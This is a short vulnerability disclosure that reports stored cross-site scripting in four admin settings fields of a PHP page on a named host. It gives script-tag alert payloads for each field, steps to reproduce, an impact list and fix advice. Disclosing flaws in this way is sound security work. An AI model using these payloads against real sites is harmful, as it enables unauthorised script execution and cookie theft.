# Stored Cross-Site Scripting (XSS) via Admin Content Management Fields

## Summary

A Stored Cross-Site Scripting (XSS) vulnerability exists in the admin content management functionality of the application. User-controlled input submitted through multiple admin configuration fields is stored and rendered without proper sanitization, leading to persistent JavaScript execution.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/22.php
```

---

## Vulnerable Input Fields

```text
Site Title
Site Description
Welcome Message
Footer Text
```

---

## Payloads Used

### Site Title

```html
"xicorr><sCript>alert("xicorXSS1")</sCript>
```

### Site Description

```html
"xicorr><sCript>alert("xicorXSS2")</sCript>
```

### Welcome Message

```html
"xicorr><sCript>alert("xicorXSS3")</sCript>
```

### Footer Text

```html
"xicorr><sCript>alert("xicorXSS4")</sCript>
```

---

## Steps to Reproduce

1. Open the following page in a browser:

   ```text
   http://kzlabs.com/22.php
   ```

2. Insert the payloads into the vulnerable fields.

3. Click `Update Settings`.

4. Observe that the payloads are stored and executed when the content is rendered.

---

## Proof of Concept

```text
http://kzlabs.com/22.php
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/f3d1f389-afb4-4055-a877-06076680b8dc" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/071daf97-a32f-4649-8e71-0b24afa6f23b" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/eeea0def-64da-45fd-ab2d-9f7e6b22d964" />
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/1243c865-324d-4dce-a6bd-d631d5e03544" />

---

## Impact

* Session hijacking
* Cookie theft
* Persistent JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Sanitize stored content
* Secure rendering
